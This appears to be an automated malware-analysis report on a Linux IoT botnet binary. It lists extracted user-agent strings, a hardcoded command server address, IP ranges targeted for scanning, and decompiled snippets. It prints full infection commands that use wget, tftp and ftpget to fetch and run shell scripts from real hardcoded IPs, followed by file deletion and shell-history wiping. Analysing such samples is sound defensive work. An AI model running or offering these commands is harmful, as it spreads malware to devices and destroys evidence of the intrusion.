Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:24.0) Gecko/20100101 Firefox/24.0
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)
Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8
Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7pre) Gecko/20100925 Firefox/4.0b7pre
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.3a1pre) Gecko/20100128 Minefield/3.7a1pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2
Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13
Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3
Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1
Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60
Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3
Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25
Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)
Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)
Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620
Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)
Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22
Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)
Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36
Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
185.158.113.30:77
8.8.8.8
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
43.252.%d.%d
43.239.%d.%d
85.3.%d.%d
37.158.%d.%d
95.9.%d.%d
41.252.%d.%d
58.71.%d.%d
104.55.%d.%d
78.186.%d.%d
78.189.%d.%d
77.209.%d.%d
88.5.%d.%d
103.20.%d.%d
103.47.%d.%d
103.57.%d.%d
45.117.%d.%d
101.51.%d.%d
137.59.%d.%d
1.56.%d.%d
1.188.%d.%d
14.204.%d.%d
27.0.%d.%d
27.8.%d.%d
27.50.%d.%d
27.54.%d.%d
27.98.%d.%d
27.112.%d.%d
27.192.%d.%d
36.32.%d.%d
36.248.%d.%d
39.64.%d.%d
42.4.%d.%d
42.48.%d.%d
42.52.%d.%d
42.56.%d.%d
42.63.%d.%d
42.84.%d.%d
42.176.%d.%d
42.224.%d.%d
60.0.%d.%d
60.16.%d.%d
163.53.%d.%d
62.30.%d.%d
62.252.%d.%d
62.254.%d.%d
62.255.%d.%d
77.96.%d.%d
77.97.%d.%d
77.98.%d.%d
77.100.%d.%d
77.102.%d.%d
113.191.%d.%d
81.100.%d.%d
113.188.%d.%d
113.189.%d.%d
94.174.%d.%d
14.160.%d.%d
14.161.%d.%d
14.162.%d.%d
14.163.%d.%d
14.164.%d.%d
14.165.%d.%d
14.166.%d.%d
14.167.%d.%d
14.168.%d.%d
14.169.%d.%d
14.170.%d.%d
14.171.%d.%d
14.172.%d.%d
14.173.%d.%d
14.174.%d.%d
14.175.%d.%d
14.176.%d.%d
14.177.%d.%d
14.178.%d.%d
14.179.%d.%d
14.180.%d.%d
14.181.%d.%d
14.182.%d.%d
14.183.%d.%d
14.184.%d.%d
14.185.%d.%d
14.186.%d.%d
14.187.%d.%d
14.188.%d.%d
14.189.%d.%d
14.190.%d.%d
14.191.%d.%d
45.121.%d.%d
45.120.%d.%d
45.115.%d.%d
43.230.%d.%d
43.240.%d.%d
43.245.%d.%d
41.174.%d.%d
49.118.%d.%d
78.188.%d.%d
45.127.%d.%d
103.30.%d.%d
14.33.%d.%d
123.16.%d.%d
202.44.%d.%d
116.93.%d.%d
91.83.%d.%d
41.253.%d.%d
117.173.%d.%d
113.190.%d.%d
146.88.%d.%d
112.196.%d.%d
113.178.%d.%d
112.45.%d.%d
183.223.%d.%d
%d.%d.%d.%d
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
/proc/cpuinfo
/proc/net/route
/proc/stat
/proc/cpuinfo
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
history -c;history -w
cd /root;rm -rf .bash_history
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c
ClearHistory
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
 cd /var/; rm -rf cuntysshd; wget http://64.137.253.50/cuntysshd || tftp -r cuntysshd -g 64.137.253.50; chmod 777 cuntysshd; ./cuntysshd; rm -rf cuntysshd
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 74666
+++TOTAL FUNCTIONS 			:366
+++LINES PER FUNCTION RATIO 	: 204.005464480874
+++SUSPECTED LINES COUNT 	: 1667
+++SUSPECTED LINES RATIO 	: 2.23260921972518
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 74666
+++WHILE (TRUE) LINES			: 16188
+++WHILE (TRUE) LINES RATION		:21.6805507192029%
+++WHILE (TRUE) LOOPS COUNT		: 272
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)",
    char (*v76)[507] = "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
        "/dev/netslink/",
        "/tmp/",
        "/var/",
        "/dev/",
        "/var/run/",
        "/dev/shm/",
        "/boot/",
        "/usr/",
        "/opt/"
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
            execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    int32_t v98 = __GI_open((int32_t)"/proc/cpuinfo", 0); // 0x9674
    int32_t v100 = __GI_open((int32_t)"/proc/cpuinfo", 0); // 0x98a4
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
        __libc_system((int32_t)"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c");
        int32_t v104 = __GI_open((int32_t)"/proc/net/route", 0); // 0x10b4c
    int32_t v92 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x10e34
    char * v94 = "/etc/rc.d/rc.local";
        v93 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        v94 = "/etc/rc.conf";
                                int32_t v114 = __GI_fopen((int32_t)v94, (int32_t)&v113); // 0x10fbc
int32_t __GI_fopen(int32_t a1, int32_t a2) {
    return _stdio_fopen();
int32_t _stdio_fopen(void) {
    if (__GI_fopen(v98, (int32_t)&v97 - 2268) == 0) {
        int32_t v107 = __GI_fopen(v96 - 1296, v96 - 2268); // 0x1bb9c
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",

        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",

        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",

        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",

        "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",

        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",

        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",

        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",

        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",

        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",

        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",

        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",

        "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",

        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",

        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",

        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",

        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",

        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",

        "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",

        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",

        "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",

        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",

        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",

        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",

        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",

        "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",

        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)",

        "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",

        "185.158.113.30:77"

    char (*v74)[18] = "185.158.113.30:77";

    char (*v76)[507] = "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";

        szprintf((int32_t)&v103, (int32_t)"43.252.%d.%d", (int32_t)v96, (int32_t)v97, 0);

        szprintf((int32_t)&v103, (int32_t)"43.239.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"85.3.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"37.158.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"95.9.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"41.252.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"58.71.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"104.55.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"78.186.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"78.189.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"77.209.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"88.5.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"43.239.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"103.20.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"103.47.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"103.57.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"45.117.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"101.51.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"137.59.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

        szprintf((int32_t)&v103, (int32_t)"1.56.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);

